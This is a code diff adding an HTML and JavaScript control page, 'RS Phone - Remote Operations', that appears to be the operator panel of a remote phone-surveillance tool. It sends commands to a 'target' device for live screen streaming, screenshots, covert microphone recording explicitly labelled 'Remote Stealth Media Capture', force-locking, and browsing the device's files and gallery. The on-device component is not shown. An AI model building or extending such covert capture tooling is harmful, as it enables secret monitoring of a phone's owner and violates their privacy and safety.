@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RS Phone - Remote Operations</title>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        /* ==================== CORE STYLES ==================== */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
+        body { background-color: #121212; color: #ffffff; padding: 15px; padding-bottom: 40px; }
+        
+        .header { display: flex; align-items: center; gap: 15px; margin-bottom: 25px; padding-bottom: 15px; border-bottom: 1px solid #333; }
+        .back-btn { background: rgba(255,255,255,0.1); border: none; border-radius: 8px; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; cursor: pointer; color: #fff; transition: background 0.2s; text-decoration: none; }
+        .back-btn:hover { background: rgba(255,255,255,0.2); }
+        .header h2 { font-size: 20px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: #3498db; }
+        .header-desc { font-size: 12px; color: #888; margin-top: 4px; }
+
+        /* ==================== CARD GRID STYLES ==================== */
+        .card-container { display: flex; flex-direction: column; gap: 16px; }
+        
+        .flat-card {
+            background-color: #1e1e1e; padding: 22px 20px; border-radius: 6px;
+            position: relative; overflow: hidden; border-left: 4px solid #555;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+        
+        /* Thematic Color Borders */
+        .border-blue { border-left-color: #3498db; }
+        .border-teal { border-left-color: #1abc9c; }
+        .border-red { border-left-color: #e74c3c; }
+        .border-purple { border-left-color: #9b59b6; }
+        
+        .card-header { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; z-index: 2; position: relative; }
+        .card-icon { color: #fff; opacity: 0.9; }
+        .card-title { font-size: 18px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
+        .card-subtitle { font-size: 12px; opacity: 0.7; margin-top: 3px; display: block; }
+        
+        /* ==================== ACTION ROW STYLES ==================== */
+        .action-row { display: flex; gap: 10px; width: 100%; z-index: 2; position: relative; flex-wrap: wrap; }
+        
+        .btn { 
+            flex: 1; padding: 12px; border: none; border-radius: 4px; font-weight: 600; 
+            font-size: 13px; text-transform: uppercase; cursor: pointer; 
+            background: #2a2a2a; color: white; transition: all 0.2s; text-align: center;
+            border: 1px solid #444; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px;
+        }
+        .btn:active { transform: scale(0.98); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        .btn-primary { background: #3498db; border-color: #2980b9; color: #fff; }
+        .btn-danger { background: rgba(231, 76, 60, 0.8); border-color: #c0392b; }
+        .btn-warning { background: rgba(241, 196, 15, 0.8); border-color: #f39c12; color: #000; }
+        .btn-success { background: rgba(46, 204, 113, 0.8); border-color: #27ae60; }
+        
+        .bg-icon { position: absolute; right: -20px; top: -10px; width: 140px; height: 140px; opacity: 0.05; z-index: 1; transform: rotate(-15deg); }
+
+        /* Component Specifics */
+        select.dropdown { background: #2a2a2a; color: white; border: 1px solid #444; border-radius: 4px; padding: 12px; outline: none; font-weight: bold; flex: 1; }
+        
+        .live-stream-viewport {
+            width: 100%; height: 260px; background: #000; border-radius: 4px;
+            margin-top: 15px; display: none; align-items: center; justify-content: center;
+            border: 2px dashed #3498db; position: relative; z-index: 2;
+        }
+        .live-stream-canvas { width: 100%; height: 100%; object-fit: contain; }
+    </style>
+</head>
+<body>
+
+    <!-- ================================================================================= -->
+    <!-- MASTER NAVIGATION HEADER                                                          -->
+    <!-- ================================================================================= -->
+    <div class="header">
+        <a href="/dashboard" class="back-btn"><i data-lucide="chevron-left"></i></a>
+        <div>
+            <h2>Remote Ops Center</h2>
+            <div class="header-desc" id="active-device-label">Validating Target Context...</div>
+        </div>
+    </div>
+
+    <!-- ================================================================================= -->
+    <!-- REMOTE COMMANDS GRID                                                              -->
+    <!-- ================================================================================= -->
+    <div class="card-container">
+
+        <!-- 1. LIVE SCREEN MIRRORING -->
+        <div class="flat-card border-blue">
+            <i data-lucide="monitor" class="bg-icon"></i>
+            <div class="card-header">
+                <i data-lucide="tv" class="card-icon"></i>
+                <div>
+                    <span class="card-title">Live Screen Mirroring</span>
+                    <span class="card-subtitle">Real-time WebSocket Data Stream (No Cloud Caching)</span>
+                </div>
+            </div>
+            
+            <div class="action-row">
+                <select id="stream-duration" class="dropdown">
+                    <option value="1">1 Min Request</option>
+                    <option value="2">2 Min Request</option>
+                    <option value="3">3 Min Request</option>
+                </select>
+                <button class="btn btn-primary" id="btn-toggle-stream" onclick="toggleScreenStream()">
+                    <i data-lucide="play" style="width:16px; height:16px;"></i> Start Stream
+                </button>
+            </div>
+            
+            <div class="live-stream-viewport" id="stream-viewport">
+                <div id="stream-placeholder" style="position: absolute; color: #888; font-size: 13px;">Awaiting WebSocket Frame Chunks...</div>
+                <canvas id="stream-canvas" class="live-stream-canvas"></canvas>
+            </div>
+        </div>
+
+        <!-- 2. LIVE OPS (MEDIA CAPTURE) -->
+        <div class="flat-card border-teal">
+            <i data-lucide="cast" class="bg-icon"></i>
+            <div class="card-header">
+                <i data-lucide="video" class="card-icon"></i>
+                <div>
+                    <span class="card-title">Live Ops</span>
+                    <span class="card-subtitle">Remote Stealth Media Capture</span>
+                </div>
+            </div>
+            
+            <div class="action-row">
+                <button class="btn" onclick="triggerCommand('take_screenshot', 'Screenshot')">
+                    <i data-lucide="camera" style="width:16px; height:16px;"></i> Capture Screen
+                </button>
+            </div>
+            <div class="action-row" style="margin-top: 10px;">
+                <select id="audio-duration" class="dropdown">
+                    <option value="60">1 Min Record</option>
+                    <option value="120">2 Min Record</option>
+                </select>
+                <button class="btn" onclick="triggerCommand('record_audio', 'Record Audio')">
+                    <i data-lucide="mic" style="width:16px; height:16px;"></i> Record Mic
+                </button>
+            </div>
+        </div>
+
+        <!-- 3. TACTICAL COMMAND -->
+        <div class="flat-card border-red">
+            <i data-lucide="shield-alert" class="bg-icon"></i>
+            <div class="card-header">
+                <i data-lucide="shield" class="card-icon"></i>
+                <div>
+                    <span class="card-title">Tactical Command</span>
+                    <span class="card-subtitle">Emergency Control Protocols</span>
+                </div>
+            </div>
+            
+            <div class="action-row">
+                <button class="btn btn-warning" onclick="triggerCommand('ring_device', 'Ring Alarm')">Ring Alarm</button>
+                <button class="btn btn-danger" onclick="triggerCommand('call_admin', 'Admin Call')">Admin Call</button>
+                <button class="btn" onclick="triggerCommand('force_lock', 'Force Lock')">Force Lock</button>
+            </div>
+        </div>
+
+        <!-- 4. MEDIA VAULTS (FILE MANAGER & GALLERY) -->
+        <div class="flat-card border-purple">
+            <i data-lucide="hard-drive" class="bg-icon"></i>
+            <div class="card-header">
+                <i data-lucide="folder-open" class="card-icon"></i>
+                <div>
+                    <span class="card-title">Storage Vaults</span>
+                    <span class="card-subtitle">Browse Files & Media Gallery</span>
+                </div>
+            </div>
+            
+            <div class="action-row">
+                <a href="/files" class="btn"><i data-lucide="folder" style="width:16px; height:16px;"></i> File Manager</a>
+                <a href="/gallery" class="btn"><i data-lucide="image" style="width:16px; height:16px;"></i> Live Gallery</a>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- ================================================================================= -->
+    <!-- JAVASCRIPT ENGINE (Isolated & Autonomous)                                         -->
+    <!-- ================================================================================= -->
+    <script>
+        // Init Icons
+        lucide.createIcons();
+
+        // Environment Setup
+        const deviceId = localStorage.getItem('active_device_id');
+        const token = localStorage.getItem('owner_token');
+        
+        document.addEventListener('DOMContentLoaded', () => {
+            if (!deviceId) {
+                document.getElementById('active-device-label').innerText = "ERROR: No Active Target Selected";
+                document.getElementById('active-device-label').style.color = "#e74c3c";
+            } else {
+                document.getElementById('active-device-label').innerText = `Target Context Authorized [ID: ${deviceId.substring(0,6)}...]`;
+            }
+        });
+
+        // 🚀 THE MASTER COMMAND DISPATCHER 
+        window.triggerCommand = async function(commandString, commandName) {
+            if (!deviceId) return alert("Critical Error: No active device selected from Dashboard.");
+            
+            const isConfirmed = confirm(`AWAITING CONFIRMATION: Deploy ${commandName} protocol?`);
+            if (!isConfirmed) return;
+
+            if (commandString === 'record_audio') {
+                const durationElement = document.getElementById('audio-duration');
+                if (durationElement) commandString = `record_audio:${durationElement.value}`;
+            }
+
+            try {
+                const res = await fetch(`/api/devices/${deviceId}/action`, {
+                    method: 'POST',
+                    headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: commandString }) 
+                });
+                
+                const result = await res.json();
+                if (result.status === 'success') {
+                    alert(`✅ Command [${commandName}] dispatched to target.`);
+                    window.location.href = '/ops'; // Redirect to Vault to see status
+                } else {
+                    alert(`❌ Dispatch Failed: ${result.message}`);
+                }
+            } catch (e) {
+                alert("Network Exception: Relay node unreachable.");
+            }
+        };
+
+        // 🚀 LIVE SCREEN WEBSOCKET PIPELINE
+        let liveSocketPipeline = null;
+
+        window.toggleScreenStream = async function() {
+            const btn = document.getElementById('btn-toggle-stream');
+            const viewport = document.getElementById('stream-viewport');
+            const canvas = document.getElementById('stream-canvas');
+            const placeholder = document.getElementById('stream-placeholder');
+            const duration = document.getElementById('stream-duration').value;
+
+            if (!deviceId) return alert("Select target context first.");
+
+            if (btn.innerText.includes("Start Stream")) {
+                try {
+                    await fetch(`/api/devices/${deviceId}/action`, {
+                        method: 'POST',
+                        headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ action: `start_screen_stream:${duration}` })
+                    });
+                } catch (err) { console.warn("Stream init silent fail."); }
+
+                const protocol = window.location.protocol === "https:" ? "wss" : "ws";
+                liveSocketPipeline = new WebSocket(`${protocol}://${window.location.host}/ws/dashboard/${deviceId}`);
+                liveSocketPipeline.binaryType = "blob"; 
+
+                const ctx = canvas.getContext('2d');
+
+                liveSocketPipeline.onmessage = function(event) {
+                    if (placeholder) placeholder.style.display = "none";
+                    const img = new Image();
+                    img.onload = function() {
+                        canvas.width = img.width;
+                        canvas.height = img.height;
+                        ctx.drawImage(img, 0, 0);
+                        URL.revokeObjectURL(img.src); 
+                    };
+                    img.src = URL.createObjectURL(event.data);
+                };
+
+                liveSocketPipeline.onclose = () => window.resetStreamUI(btn, viewport, placeholder);
+
+                btn.innerHTML = `<i data-lucide="square" style="width:16px; height:16px;"></i> Stop Stream`;
+                btn.className = "btn btn-danger";
+                viewport.style.display = "flex";
+                lucide.createIcons();
+
+            } else {
+                if (liveSocketPipeline) liveSocketPipeline.close();
+                try {
+                    await fetch(`/api/devices/${deviceId}/action`, {
+                        method: 'POST',
+                        headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ action: "stop_screen_stream" })
+                    });
+                } catch(e) {}
+                window.resetStreamUI(btn, viewport, placeholder);
+            }
+        };
+
+        window.resetStreamUI = function(btn, viewport, placeholder) {
+            btn.innerHTML = `<i data-lucide="play" style="width:16px; height:16px;"></i> Start Stream`;
+            btn.className = "btn btn-primary";
+            viewport.style.display = "none";
+            placeholder.style.display = "block";
+            lucide.createIcons();
+        };
+    </script>
+</body>
+</html>
